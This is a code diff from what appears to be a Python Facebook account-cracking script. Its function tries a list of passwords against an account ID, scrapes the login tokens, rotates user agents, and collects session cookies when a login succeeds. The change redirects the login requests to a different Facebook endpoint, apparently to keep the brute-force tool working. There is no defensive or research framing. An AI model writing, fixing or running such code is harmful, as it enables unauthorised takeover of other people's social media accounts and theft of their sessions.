@@ -1307,7 +1307,7 @@ def m6(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://free.facebook.com').text
+   free_fb = session.get(f'https://lm.facebook.com').text
    log_data = {
         "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 
         "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), 
@@ -1347,7 +1347,7 @@ def m6(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers',}#'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
-   lo = session.post('https://mobile.facebook.com/login',data=log_data,headers=header_freefb).text
+   lo = session.post('https://lm.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
